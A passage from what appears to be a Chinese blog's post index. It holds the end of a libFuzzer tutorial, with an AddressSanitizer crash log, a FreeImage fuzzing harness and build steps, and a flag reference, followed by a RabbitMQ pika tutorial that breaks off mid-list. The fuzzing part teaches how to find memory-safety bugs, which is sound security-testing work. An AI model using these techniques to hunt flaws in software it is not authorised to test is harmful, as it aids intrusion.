12Mb L: 61 MS: 2 ChangeByte-InsertRepeatedBytes-\n#468765 NEW    cov: 6 ft: 6 corp: 4/78b exec/s: 0 rss: 49Mb L: 13 MS: 4 CrossOver-ChangeBit-EraseBytes-ChangeByte-\n#564131 NEW    cov: 7 ft: 7 corp: 5/97b exec/s: 0 rss: 56Mb L: 19 MS: 5 InsertRepeatedBytes-InsertByte-ChangeByte-InsertByte-InsertByte-\n=================================================================\n==32049==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200072bb93 at pc 0x000000528540 bp 0x7ffdb3439100 sp 0x7ffdb34390f8\nREAD of size 1 at 0x60200072bb93 thread T0\n    ......................................................\n    ......................................................\n    ......................................................\n\n0x60200072bb93 is located 0 bytes to the right of 3-byte region [0x60200072bb90,0x60200072bb93)\nallocated by thread T0 here:\n   ......................................................\n   ......................................................\n   ......................................................\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow /home/haclh/vmdk_kernel/libfuzzer-workshop-master/lessons/04/./vulnerable_functions.h:22:14 in VulnerableFunction1(unsigned char const*, unsigned long)\nShadow bytes around the buggy address:\n  0x0c04800dd720: fa fa fd fd fa fa fd fa fa fa fd fa fa fa fd fa\n  0x0c04800dd730: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd\n  0x0c04800dd740: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa\n  0x0c04800dd750: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa\n  0x0c04800dd760: fa fa fd fa fa fa fd fa fa fa fd fd fa fa fd fd\n=>0x0c04800dd770: fa fa[03]fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c04800dd780: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c04800dd790: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c04800dd7a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c04800dd7b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c04800dd7c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n......................................................\n......................................................\n==32049==ABORTING\nMS: 1 CrossOver-; base unit: 38a223b0988bd9576fb17f5947af80b80203f0ef\n0x46,0x55,0x5a,\nFUZ\nartifact_prefix='./'; Test unit written to ./crash-0eb8e4ed029b774d80f2b66408203801cb982a60\nBase64: RlVa\n```\n\n首先我们可以看出来`Seed: 1608565063` 说明这次的种子数据，如果我们想重现重新运行`-seed=1608565063`以得到相同的结果。其次`-max_len is not provided, using 64` ， `-max_len` 用于设置最大的数据长度，因为没有设置fuzzer会自己猜测，这里设置的数据不大于64KB。\n\n接下来 `#` 开头的行是 `fuzz` 过程中找到的路径信息\n\n```bash\n# 564131 NEW    cov: 7 ft: 7 corp: 5/97b exec/s: 0 rss: 56Mb L: 19 MS: 5 InsertRepeatedBytes-InsertByte-ChangeByte-InsertByte-InsertByte-\n```\n\n我们可以看出来libFuzzer尝试了至少564131个输入（`#564131`），发现了5个输入，总共97个字节（`corp: 5/97b`），它们总共覆盖了7个*覆盖点*（`cov: 7`）。我们可以将覆盖点视为代码中的 [基本块](https://en.wikipedia.org/wiki/Basic_block)。\n\n```bash\n==32049==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200072bb93 at pc 0x000000528540 bp 0x7ffdb3439100 sp 0x7ffdb34390f8\nREAD of size 1 at 0x60200072bb93 thread T0\n```\n\n这个信息说明在其中一个输入上，AddressSanitizer已检测到`heap-buffer-overflow`错误并中止了执行。\n\n```bash\nartifact_prefix='./'; Test unit written to ./crash-0eb8e4ed029b774d80f2b66408203801cb982a60\n```\n\n倒数第二行是触发漏洞的测试用例，在退出进程之前，libFuzzer已创建了一个文件，其中包含触发崩溃的字节和所有信息，要重现崩溃而无模糊运行可以使用\n\n```bash\nASAN_OPTIONS=symbolize=1 ./first_fuzzer ./crash-0eb8e4ed029b774d80f2b66408203801\n# ASAN_OPTIONS=symbolize=1 用于显示栈的符号信息\n```\n\n来重现crash\n\n如果我们在fuzzer运行的选项里有使用字典 `-dictionary`和`-print_final_stats`执行完打印统计信息，最后的输出可能还会多出两块，形如下面\n\n```bash\n###### Recommended dictionary. ######\n\"X\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" # Uses: 1228\n\"prin\" # Uses: 1353\n...........................\n...........................\n...........................\n\"U</UTrri\\x09</UTD\" # Uses: 61\n###### End of recommended dictionary. ######\nDone 1464491 runs in 301 second(s)\nstat::number_of_executed_units: 1464491\nstat::average_exec_per_sec:     4865\nstat::new_units_added:          1407\nstat::slowest_unit_time_sec:    0\nstat::peak_rss_mb:              407\n```\n\n开始由 `####` 夹着的是 `libfuzzer` 在 `fuzz` 过程中挑选出来的 `dictionary`， 同时还给出了使用的次数，这些 `dictionary` 可以在以后 `fuzz` 同类型程序时 节省 `fuzz` 的时间。\n\n然后以 `stat:` 开头的是一些 fuzz 的统计信息， 主要看 `stat::new_units_added` 表示整个 `fuzz` 过程中触发了多少个代码单元。\n\n可以看到直接 `fuzz` , `5`分钟 触发了 `1407` 个代码单元\n\n## 实例篇\n\n### 以Freeimage为例进行测试\n\n我们首先把最新版本的Freeimage给拉到本地，然后解压\n\n```bash\nwget https://downloads.sourceforge.net/freeimage/FreeImage3180.zip\nunzip FreeImage3180.zip\n```\n\n![截屏2020-06-07 下午3.30.33](https://tva1.sinaimg.cn/large/007S8ZIlly1gfjsagnbtqj316n09bn5y.jpg)\n\n对这个源包先进行一下编译\n\n```bash\npushd FreeImage\n\n# b44ExpLogTable.cpp only contains a definition of main().\nsed -i 's/Source\\/OpenEXR\\/IlmImf\\/b44ExpLogTable.cpp//' Makefile.srcs\nmake LIBRARIES=-lc++ -j$(nproc)\n\npopd\n```\n\n![截屏2020-06-07 下午4.06.37](https://tva1.sinaimg.cn/large/007S8ZIlly1gfjsf6ax3uj30yh0eshbw.jpg)\n\n编译成功后在Freeimage/Dist里应该就生成了`libfreeimage.a` ,`.h`和 ` .o`文件\n\n![截屏2020-06-07 下午4.11.18](https://tva1.sinaimg.cn/large/007S8ZIlly1gfjsk1djg6j30f406l0tf.jpg)\n\n随后根据Freeimage的功能特性写对应的hardness，也就是fuzzing target，这里直接使用OSS-fuzz的project中给出的Freeimage的hardness，在根目录保存为load_from_memory_fuzzer.cc文件\n\n```c++\n#include <cstddef>\n#include <cstdint>\n#include <cstdlib>\n#include <vector>\n#include <FreeImage.h>\n\nnamespace {\n\n// Returns true if the format should be attempted to loaded from memory.\nbool SafeToLoadFromMemory(FREE_IMAGE_FORMAT fif) {\n  // For now, just load if it is a BMP. Future heuristics may need to be based\n  // on the expected size in different formats for memory regions to avoid OOMs.\n  return fif == FIF_BMP;\n}\n\n}  // namespace\n\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) {\n  static bool initialized = false;\n  if (!initialized) {\n    FreeImage_Initialise();\n  }\n\n  if (size > 100 * 1000) {\n    return 0;\n  }\n\n  std::vector<uint8_t> fuzzer_data_vector(data, data + size);\n  FIMEMORY* fiMem = FreeImage_OpenMemory(\n      reinterpret_cast<unsigned char*>(fuzzer_data_vector.data()),\n      fuzzer_data_vector.size());\n\n  FREE_IMAGE_FORMAT fif = FreeImage_GetFileTypeFromMemory(fiMem, 0);\n  if (SafeToLoadFromMemory(fif)) {\n    FIBITMAP* fiBitmap = FreeImage_LoadFromMemory(fif, fiMem);\n    FreeImage_Unload(fiBitmap);\n  }\n  FreeImage_CloseMemory(fiMem);\n\n  return 0;\n}\n```\n\n接下来的步骤就是开始编译fuzzer，把对应参数输入在后面，使用clang++开始编译\n\n```bash\nclang++ -g -fsanitize=fuzzer,address \\\nload_from_memory_fuzzer.cc ./FreeImage/Dist/libfreeimage.a \\\n-o load_from_memory_fuzzer\n```\n\n![截屏2020-06-07 下午4.20.47](https://tva1.sinaimg.cn/large/007S8ZIlly1gfjstwsua4j30g402wdh5.jpg)\n\n出现了一点错误，看来是Freeimage.h文件没有找到，需要用-I 指定一下文件的路径让他可以找到\n\n```bash\nclang++ -g -fsanitize=fuzzer,address -I'/home/fstark/FreeImage/Dist' \\\nload_from_memory_fuzzer.cc ./FreeImage/Dist/libfreeimage.a \\\n-o load_from_memory_fuzzer\n```\n\n这次成功了，发现已经成功生成了load_from_memory_fuzzer\n\n![截屏2020-06-07 下午4.23.28](https://tva1.sinaimg.cn/large/007S8ZIlly1gfjswpiuydj30hw05zgnu.jpg)\n\n不加任何附加命令直接运行一下试试，发现可以跑了，就是速度不怎么快\n\n![截屏2020-06-07 下午4.27.42](https://tva1.sinaimg.cn/large/007S8ZIlly1gfjt13bmogj30hx0apdkv.jpg)\n\n当我做到这一步时，学长点拨前面的编译是有问题的，运行时结果仅覆盖57是肯定有问题的。通过在开会时看学长的讲解分析，确实在编译的时候直接拉freeimage的包，里面的makefile需要修改。这里把编译选项更改一下，其实我又回顾了一下之前clusterfuzz踩的坑，其中心脏滴血在编译的时候就要求加上`-fsanitize=address,fuzzer-no-link`，但之前没有细心注意。\n\n![image-20200608210908837](https://tva1.sinaimg.cn/large/007S8ZIlly1gfl6s8fzqjj30ha08eq3y.jpg)\n\n我们在makefile.gnu里把默认的03改成01，再加上这几条推荐的编译选项，不得不说自己对于常见的编译过程真是陌生，要不是靠学长又是进坑几个小时，真要抽个时间好好补补这部分的内容了，做个编译过程大梳理和常见编译器对比什么的\n\n![image-20200608211104945](https://tva1.sinaimg.cn/large/007S8ZIlly1gfl6u71z4kj30wu087jv6.jpg)\n\n这样再编译一遍，不放样本，速度也好了很多\n\n![image-20200608220457407](https://tva1.sinaimg.cn/large/007S8ZIlly1gfl8e9ir1ej30pj0fctht.jpg)\n\n简单准备个样本集，再精简一下\n\n![截屏2020-06-09 上午11.08.57](https://tva1.sinaimg.cn/large/007S8ZIlly1gflvdgizo9j30ra0alahs.jpg)\n\n简单跑一下，这次就可以跑出crash了，但是很多是重复的在跑的时候附加的选项还是要多多限制，逐渐摸索，但整体流程就是这样了\n\n![截屏2020-06-09 上午11.18.29](https://tva1.sinaimg.cn/large/007S8ZIlly1gflvetkoakj31020i6dur.jpg)\n\n## 附件一\n\n| Flags:                   | value | strictly in form -flag=value                                 |\n| ------------------------ | ----- | ------------------------------------------------------------ |\n| verbosity                | 1     | Verbosity level.                                             |\n| seed                     | 0     | Random seed. If 0, seed is generated.                        |\n| runs                     | -1    | Number of individual test runs (-1 for infinite runs).       |\n| max_len                  | 0     | Maximum length of the test input. If 0, libFuzzer tries to guess a good value based on the corpus and reports it. |\n| lea_control              | 100   | Try generating small inputs first, then try larger inputs over time. Specifies the rate at which the length limit is increased (smaller == faster). If 0, immediately try inputs with size up to max_len. Default value is 0, if LLVMFuzzerCustomMutator is used. |\n| seed_inputs              | 0     | A comma-separated list of input files to use as an additional seed corpus. Alternatively, an \"@\" followed by the name of a file containing the comma-seperated list. |\n| cross_over               | 1     | If 1, cross over inputs.                                     |\n| mutate_depth             | 5     | Apply this number of consecutive mutations to each input.    |\n| reduce_depth             | 0     | Experimental/internal. Reduce depth if mutations lose unique features |\n| shuffle                  | 1     | Shuffle inputs at startup                                    |\n| prefer_small             | 1     | If 1, always prefer smaller inputs during the corpus shuffle. |\n| timeout                  | 1200  | Timeout in seconds (if positive). If one unit runs more than this number of seconds the process will abort. |\n| error_exitcode           | 77    | When libFuzzer itself reports a bug this exit code will be used. |\n| timeout_exitcode         | 70    | When libFuzzer reports a timeout this exit code will be used. |\n| max_total_time           | 0     | If positive, indicates the maximal total time in seconds to run the fuzzer. |\n| help                     | 0     | Print help.                                                  |\n| fork                     | 0     | Experimental mode where fuzzing happens in a subprocess      |\n| ignore_timeouts          | 1     | Ignore timeouts in fork mode                                 |\n| ignore_ooms              | 1     | Ignore OOMs in fork mode                                     |\n| ignore_crashes           | 0     | Ignore crashes in fork mode                                  |\n| merge                    | 0     | If 1, the 2-nd, 3-rd, etc corpora will be merged into the 1-st corpus. Only interesting units will be taken. This flag can be used to minimize a corpus. |\n| stop_file                | 0     | Stop fuzzing ASAP if this file exists                        |\n| merge_control_file       | 0     | Specify a control file used for the merge process. If a merge process gets killed it tries to leave this file in a state suitable for resuming the merge. By default a temporary file will be used. |\n| minimize_crash           | 0     | If 1, minimizes the provided crash input. Use with -runs=N or -max_total_time=N to limit the number attempts. Use with -exact_artifact_path to specify the output. Combine with ASAN_OPTIONS=dedup_token_length=3 (or similar) to ensure that the minimized input triggers the same crash. |\n| cleanse_crash            | 0     | If 1, tries to cleanse the provided crash input to make it contain fewer original bytes. Use with -exact_artifact_path to specify the output. |\n| use_counters             | 1     | Use coverage counters                                        |\n| use_memmem               | 1     | Use hints from intercepting memmem, strstr, etc              |\n| use_value_profile        | 0     | Experimental. Use value profile to guide fuzzing.            |\n| use_cmp                  | 1     | Use CMP traces to guide mutations                            |\n| shrink                   | 0     | Experimental. Try to shrink corpus inputs.                   |\n| reduce_inputs            | 1     | Try to reduce the size of inputs while preserving their full feature sets |\n| jobs                     | 0     | Number of jobs to run. If jobs >= 1 we spawn this number of jobs in separate worker processes with stdout/stderr redirected to fuzz-JOB.log. |\n| workers                  | 0     | Number of simultaneous worker processes to run the jobs. If zero, \"min(jobs,NumberOfCpuCores()/2)\" is used. |\n| reload                   | 1     | Reload the main corpus every <N> seconds to get new units discovered by other processes. If 0, disabled |\n| report_slow_units        | 10    | Report slowest units if they run for more than this number of seconds. |\n| only_ascii               | 0     | If 1, generate only ASCII (isprint+isspace) inputs.          |\n| dict                     | 0     | Experimental. Use the dictionary file.                       |\n| artifact_prefix          | 0     | Write fuzzing artifacts (crash, timeout, or slow inputs) as $(artifact_prefix)file |\n| exact_artifact_path      | 0     | Write the single artifact on failure (crash, timeout) as $(exact_artifact_path). This overrides -artifact_prefix and will not use checksum in the file name. Do not use the same path for several parallel processes. |\n| print_pcs                | 0     | If 1, print out newly covered PCs.                           |\n| print_funcs              | 2     | If >=1, print out at most this number of newly covered functions. |\n| print_final_stats        | 0     | If 1, print statistics at exit.                              |\n| print_corpus_stats       | 0     | If 1, print statistics on corpus elements at exit.           |\n| print_coverage           | 0     | If 1, print coverage information as text at exit.            |\n| dump_coverage            | 0     | Deprecated.                                                  |\n| handle_segv              | 1     | If 1, try to intercept SIGSEGV.                              |\n| handle_bus               | 1     | If 1, try to intercept SIGBUS.                               |\n| handle_abrt              | 1     | If 1, try to intercept SIGABRT.                              |\n| handle_ill               | 1     | If 1, try to intercept SIGILL.                               |\n| handle_fpe               | 1     | If 1, try to intercept SIGFPE.                               |\n| handle_int               | 1     | If 1, try to intercept SIGINT.                               |\n| handle_term              | 1     | If 1, try to intercept SIGTERM.                              |\n| handle_xfsz              | 1     | If 1, try to intercept SIGXFSZ.                              |\n| handle_usr1              | 1     | If 1, try to intercept SIGUSR1.                              |\n| handle_usr2              | 1     | If 1, try to intercept SIGUSR2.                              |\n| lazy_counters            | 0     | If 1, a performance optimization isenabled for the 8bit inline counters. Requires that libFuzzer successfully installs its SEGV handler |\n| close_fd_mask            | 0     | If 1, close stdout at startup; if 2, close stderr; if 3, close both. Be careful, this will also close e.g. stderr of asan. |\n| detect_leaks             | 1     | If 1, and if LeakSanitizer is enabled try to detect memory leaks during fuzzing (i.e. not only at shut down). |\n| purge_allocator_interval | 1     | Purge allocator caches and quarantines every <N> seconds. When rss_limit_mb is specified (>0), purging starts when RSS exceeds 50% of rss_limit_mb. Pass purge_allocator_interval=-1 to disable this functionality. |\n| trace_malloc             | 0     | If >= 1 will print all mallocs/frees. If >= 2 will also print stack traces. |\n| rss_limit_mb             | 2048  | If non-zero, the fuzzer will exit uponreaching this limit of RSS memory usage. |\n| malloc_limit_mb          | 0     | If non-zero, the fuzzer will exit if the target tries to allocate this number of Mb with one malloc call. If zero (default) same limit as rss_limit_mb is applied. |\n| exit_on_src_pos          | 0     | Exit if a newly found PC originates from the given source location. Example: -exit_on_src_pos=foo.cc:123. Used primarily for testing libFuzzer itself. |\n| exit_on_item             | 0     | Exit if an item with a given sha1 sum was added to the corpus. Used primarily for testing libFuzzer itself. |\n| ignore_remaining_args    | 0     | If 1, ignore all arguments passed after this one. Useful for fuzzers that need to do their own argument parsing. |\n| focus_function           | 0     | Experimental. Fuzzing will focus on inputs that trigger calls to this function. If -focus_function=auto and -data_flow_trace is used, libFuzzer will choose the focus functions automatically. |\n| analyze_dict             | 0     | Experimental                                                 |\n| use_clang_coverage       | 0     | Deprecated; don't use                                        |\n| data_flow_trace          | 0     | Experimental: use the data flow trace                        |\n| collect_data_flow        | 0     | Experimental: collect the data flow trace                    |\n\n\n\n## 参考文献\n\n用libFuzzer搞事情  [http://pwn4.fun/2017/07/15/%E7%94%A8libFuzzer%E6%90%9E%E4%BA%8B%E6%83%85/](http://pwn4.fun/2017/07/15/用libFuzzer搞事情/)\n\nlibFuzzer——编译链接\n\nhttps://i-m.dev/posts/20190831-143715.html\n\nlibFuzzer –用于覆盖率指导的模糊测试的库\n\nhttps://releases.llvm.org/4.0.0/docs/LibFuzzer.html#startup-initialization\n\nlibFuzzerTutorial \n\nhttps://github.com/google/fuzzing/blob/master/tutorial/libFuzzerTutorial.md\n\nfuzz实战之libfuzzer\n\nhttps://www.secpulse.com/archives/71898.html\n\nfuzzer-test-suite\n\nhttps://github.com/google/fuzzer-test-suite\n\n","tags":["fuzz","漏洞挖掘","libFuzzer"],"categories":["二进制"]},{"title":"rabbitMQ教程记录","url":"/2021/01/25/rabittmq/","content":"\n简单来说，rabbitMQ主要解决的就是三个问题：\n\n***解耦/异步/削峰***\n\n当然这也是所有消息中间件的特点\n\n<!-- more -->\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gi6acrp6h6j30y90u0q7m.jpg)\n\n\n\n\n\n下载：\n\nwindows \n\nhttps://blog.csdn.net/zhm3023/article/details/82217222\n\n\n\n教程参考官方文档：rabbitMQ tutorials\n\n网址 https://www.rabbitmq.com/tutorials\n\n常见名词解释：\n\n- **Broker**：简单来说就是消息队列服务器实体。\n- **Exchange**：消息交换机，它指定消息按什么规则，路由到哪个队列。\n- **Queue**：消息队列载体，每个消息都会被投入到一个或多个队列。\n- **Binding**：绑定，它的作用就是把exchange和queue按照路由规则绑定起来。\n- **Routing Key**：路由关键字，exchange根据这个关键字进行消息投递。\n- **vhost**：虚拟主机，一个broker里可以开设多个vhost，用作不同用户的权限分离。\n- **producer**：消息生产者，就是投递消息的程序。\n- **consumer**：消息消费者，就是接受消息的程序。\n- **channel**：消息通道，在客户端的每个连接里，可建立多个channel，每个channel代表一个会话任务。\n- \n\n### 教程1：简单一对一\n\n生产者与消费者通过队列（queue）进行信息的传输\n\n![image-20200814175736145](https://tva1.sinaimg.cn/large/007S8ZIlly1gi6ad02mhfj30le06maa8.jpg)\n\n生产者\n\n```python\n#!/usr/bin/env python\nimport pika\n\nconnection = pika.BlockingConnection(pika.ConnectionParameters('localhost'))\nchannel = connection.channel()\nchannel.queue_declare(queue='hello')\nchannel.basic_publish(exchange='',\n                      routing_key='hello',\n                      body='Hello World!')\nprint(\" [x] Sent 'Hello World!'\")\nconnection.close()\n```\n\n消费者\n\n```python\n#!/usr/bin/env python\nimport pika\n\nconnection = pika.BlockingConnection(\n    pika.ConnectionParameters(host='localhost'))\nchannel = connection.channel()\n\nchannel.queue_declare(queue='hello')\n\n\ndef callback(ch, method, properties, body):\n    print(\" [x] Received %r\" % body)\n\n\nchannel.basic_consume(\n    queue='hello', on_message_callback=callback, auto_ack=True)\n\nprint(' [*] Waiting for messages. To exit press CTRL+C')\nchannel.start_consuming()\n```\n\n\n\n### 教程2：work工作队列\n\n![image-20200815111838307](https://tva1.sinaimg.cn/large/007S8ZIlly1gi6ad0pkmhj30kt084jru.jpg)\n\n把任务均匀分给别人，按照worker的数量完全平均分配\n\n![image-20200815111954847](https://tva1.sinaimg.cn/large/007S8ZIlly1gi6ad13qmaj31fh059wek.jpg)\n\n这时会有一个问题，如果分配任务的对象死了，那传递的消息就也消失了无法找回。\n\n我们把`auto_ack=True`的选项删除，在加上`ch.basic_ack（delivery_tag = method.delivery_tag）`开始手动消息确认，这样如果任务死了，会紧接着传递给下一个人\n\n![image-20200815112613770](https://tva1.sinaimg.cn/large/007S8ZIlly1gi6actz3a2j31fl03774c.jpg)\n\n但是RabbitMQ退出或崩溃时，它将忘记队列和消息，为了确保该队列将在RabbitMQ节点重启后继续存在，需要将其声明为*持久*\n\n```python\nchannel.queue_declare(queue='hello', durable=True)\n```\n\n为了更公平的派遣，而非仅仅是从数量上的一个一个平均分配，更要考虑被分配任务的机器是否正在工作/有空闲的时间\n\n![image-20200815113412715](https://tva1.sinaimg.cn/large/007S8ZIlly1gi6acsrs7gj30pq074aap.jpg)\n\n为了解决这个问题，我们可以将Channel＃basic_qos通道方法与 prefetch_count = 1设置一起使用。这使用basic.qos协议方法来告诉RabbitMQ一次不向工作人员提供多个消息。换句话说，在处理并确认上一条消息之前，不要将新消息发送给工作人员。而是将其分派给尚不繁忙的下一个工作人员。\n\n```python\nchannel.basic_qos(prefetch_count=1)\n```\n\n![image-20200815113321909](https://tva1.sinaimg.cn/large/007S8ZIlly1gi6actj87lj318y051jre.jpg)\n\n\n\nnew_task.py\n\n```python\n#!/usr/bin/env python\nimport pika\nimport sys\n\nconnection = pika.BlockingConnection(\n    pika.ConnectionParameters(host='localhost'))\nchannel = connection.channel()\n\nchannel.queue_declare(queue='task_queue', durable=True)\n\nmessage = ' '.join(sys.argv[1:]) or \"Hello World!\"\nchannel.basic_publish(\n    exchange='',\n    routing_key='task_queue',\n    body=message,\n    properties=pika.BasicProperties(\n        delivery_mode=2,  # make message persistent\n    ))\nprint(\" [x] Sent %r\" % message)\nconnection.close()\n```\n\n\n\nworker.py\n\n```python\n#!/usr/bin/env python\nimport pika\nimport time\n\nconnection = pika.BlockingConnection(\n    pika.ConnectionParameters(host='localhost'))\nchannel = connection.channel()\n\nchannel.queue_declare(queue='task_queue', durable=True)\nprint(' [*] Waiting for messages. To exit press CTRL+C')\n\n\ndef callback(ch, method, properties, body):\n    print(\" [x] Received %r\" % body)\n    time.sleep(body.count(b'.'))\n    print(\" [x] Done\")\n    ch.basic_ack(delivery_tag=method.delivery_tag)\n\n\nchannel.basic_qos(prefetch_count=1)\nchannel.basic_consume(queue='task_queue', on_message_callback=callback)\n\nchannel.start_consuming()\n```\n\n\n\n### 教程3：发布与订阅\n\nRabbitMQ消息传递模型的核心思想是生产者从不将任何消息直接发送到队列。实际上，生产者经常甚至根本不知道是否将消息传递到任何队列。\n\n相反，生产者只能将消息发送到*交换机*。交流是一件非常简单的事情。一方面，它接收来自生产者的消息，另一方面，将它们推入队列，*交换机*必须确切知道如何处理收到的消息。\n\n![image-20200815114302592](https://tva1.sinaimg.cn/large/007S8ZIlly1gi6acz6tcfj30n007z0t0.jpg)\n\n有几种交换类型可用：direct，topic，headers 和fanout，这里主要讨论fanout扇区，我们创建一个exchange称之为log\n\n```python\nchannel.exchange_declare(exchange='logs',\n                         exchange_type='fanout')\n```\n\n扇出交换指的是将接收到的所有消息广播到它知道的所有队列中\n\n无论何时连接到Rabbit，我们都需要一个全新的空队列。为此，我们可以创建一个具有随机名称的队列，或者甚至更好-让服务器为我们选择一个随机队列名称。我们可以通过为queue_declare提供空的queue参数来做到这一点\n\n```python\nresult = channel.queue_declare(queue='')\n```\n\n`result.method.queue`包含一个随机队列名称，它可能看起来像`amq.gen-JzTY20BRgKO-HjmUJj0wLg`\n\n其次，一旦使用方连接关闭，则应删除队列。有一个`exclusive`标志：\n\n```python\nresult = channel.queue_declare(queue='', exclusive=True)\n```\n\n我们已经创建了一个扇出交换和一个队列，现在我们需要告诉交换机将消息发送到我们的队列，交换和队列之间的关系称为*绑定 binding*。\n\n![image-20200815120339203](https://tva1.sinaimg.cn/large/007S8ZIlly1gi6aczl8dvj30lh07wmxh.jpg)\n\n```python\nchannel.queue_bind(exchange='logs',\n                   queue=result.method.queue)\n```\n\n![image-20200815135453038](https://i.loli.net/2020/08/15/oQXLHDpbWGESK1q.png)\n\nexchange里的log\n\n![image-20200815135559756](https://tva1.sinaimg.cn/large/007S8ZIlly1gi6acugqsdj30z406fmxb.jpg)\n\n两个绑定binding的queue队列\n\n![image-20200815135709463](https://tva1.sinaimg.cn/large/007S8ZIlly1gi6acux6uyj317o0dkmy7.jpg)\n\n在发送消息结束之后，两个队列会自动取消\n\n![image-20200815135917845](https://tva1.sinaimg.cn/large/007S8ZIlly1gi6acy7ccmj31a00gmjs3.jpg)\n\nreceive_logs.py\n\n```python\n#!/usr/bin/env python\nimport pika\n\nconnection = pika.BlockingConnection(\n    pika.ConnectionParameters(host='localhost'))\nchannel = connection.channel()\n\nchannel.exchange_declare(exchange='logs', exchange_type='fanout')\n\nresult = channel.queue_declare(queue='', exclusive=True)\nqueue_name = result.method.queue\n\nchannel.queue_bind(exchange='logs', queue=queue_name)\n\nprint(' [*] Waiting for logs. To exit press CTRL+C')\n\ndef callback(ch, method, properties, body):\n    print(\" [x] %r\" % body)\n\nchannel.basic_consume(\n    queue=queue_name, on_message_callback=callback, auto_ack=True)\n\nchannel.start_consuming()\n```\n\nemit_log.py\n\n```python\n#!/usr/bin/env python\nimport pika\nimport sys\n\nconnection = pika.BlockingConnection(\n    pika.ConnectionParameters(host='localhost'))\nchannel = connection.channel()\n\nchannel.exchange_declare(exchange='logs', exchange_type='fanout')\n\nmessage = ' '.join(sys.argv[1:]) or \"info: Hello World!\"\nchannel.basic_publish(exchange='logs', routing_key='', body=message)\nprint(\" [x] Sent %r\" % message)\nconnection.close()\n```\n\n\n\n### 教程4：更加复杂的订阅系统\n\n在教程三的基础上增加功能，使仅订阅消息的子集成为可能\n\n\n\nDirect exchange直接交换\n\n上一教程中的日志系统将所有消息广播给所有使用者，想要扩展它以允许根据邮件的严重性过滤邮件。例如，我们可能希望将日志消息写入磁盘的脚本仅接收严重错误，而不会在警告或信息日志消息上浪费磁盘空间。\n\n我们使用的是`fanout`，它并没有给我们太大的灵活性-它只能进行无意识的广播。\n\n我们将使用`direct`交换。`direct`交换背后的路由算法很简单-消息进入其绑定密钥与消息的路由密钥完全匹配的队列 。\n\n![image-20200815141748835](https://tva1.sinaimg.cn/large/007S8ZIlly1gi6acveo5uj30sq09yab0.jpg)\n\n在此设置中，我们可以看到绑定了两个队列的`direct`交换`X`。第一个队列由绑定键`orange`绑定，第二个队列有两个绑定，一个绑定键为`black`，另一个绑定为`green`。在这样的设置中，将使用路由键`orange`将要发布到交换机的消息路由到队列Q1。路由键为`black`或`green`的消息将转到Q2。所有其他消息将被丢弃。\n\n\n\nMultiple bindings多重绑定\n\n![image-20200815142309335](https://tva1.sinaimg.cn/large/007S8ZIlly1gi6acxadhmj30oj096q3q.jpg)\n\n用相同的绑定密钥绑定多个队列是完全可行的。如上图，我们可以使用绑定键`black`在`X`和`Q1.Q2`之间添加绑定。在这种情况下，直接交换的行为类似于`sanout`，并将消息广播到所有匹配的队列。带有`black`路由键的消息将同时传递给 `Q1`和`Q2`。\n\n将以上的运用在我们的信息系统之中\n\n![image-20200815144536340](https://tva1.sinaimg.cn/large/007S8ZIlly1gi6acxq03uj30qv0badgz.jpg)\n\nemit_log_direct.py\n\n```python\n#!/usr/bin/env python\nimport pika\nimport sys\n\nconnection = pika.BlockingConnection(\n    pika.ConnectionParameters(host='localhost'))\nchannel = connection.channel()\n\nchannel.exchange_declare(exchange='direct_logs', exchange_type='direct')\n\nseverity = sys.argv[1] if len(sys.argv) > 1 else 'info'\nmessage = ' '.join(sys.argv[2:]) or 'Hello World!'\nchannel.basic_publish(\n    exchange='direct_logs', routing_key=severity, body=message)\nprint(\" [x] Sent %r:%r\" % (severity, message))\nconnection.close()\n```\n\nreceive_logs_direct.py\n\n```python\n#!/usr/bin/env python\nimport pika\nimport sys\n\nconnection = pika.BlockingConnection(\n    pika.ConnectionParameters(host='localhost'))\nchannel = connection.channel()\n\nchannel.exchange_declare(exchange='direct_logs', exchange_type='direct')\n\nresult = channel.queue_declare(queue='', exclusive=True)\nqueue_name = result.method.queue\n\nseverities = sys.argv[1:]\nif not severities:\n    sys.stderr.write(\"Usage: %s [info] [warning] [error]\\n\" % sys.argv[0])\n    sys.exit(1)\n\nfor severity in severities:\n    channel.queue_bind(\n        exchange='direct_logs', queue=queue_name, routing_key=severity)\n\nprint(' [*] Waiting for logs. To exit press CTRL+C')\n\n\ndef callback(ch, method, properties, body):\n    print(\" [x] %r:%r\" % (method.routing_key, body))\n\n\nchannel.basic_consume(\n    queue=queue_name, on_message_callback=callback, auto_ack=True)\n\nchannel.start_consuming()\n```\n\n![image-20200815145732667](https://tva1.sinaimg.cn/large/007S8ZIlly1gi6acyoj8pj31fp07ewfg.jpg)\n\n\n\n### 教程5 更复杂的topic交换\n\n`direct`虽然相比`sanout`有了更加好的功能性，但仍有局限性，无法基于多个条件进行路由。\n\n例如我们可能只想听听来自'cron'的严重错误，也可以听听'kern'的所有日志，为了实现类似的功能我们就需要`topic`\n\n\n\ntopic exchange\n\n使用topic的exchange不能具有任意的`routing_key`，它必须是单词列表，以点分隔。这些词可以是任何东西，但通常它们指定与消息相关的某些功能。比如：“ stock.usd.nyse ”，“ nyse.vmw ”，“ quick.orange.rabbit ”。路由关键字中可以包含任意多个单词，最多255个字节。\n\ntopic的逻辑和direct很像，使用特定路由密钥发送的消息将被传递到所有与匹配的绑定密钥绑定的队列。但是，绑定键有两个重要的特殊情况：\n\n- *（star）可以代替一个单词。\n- 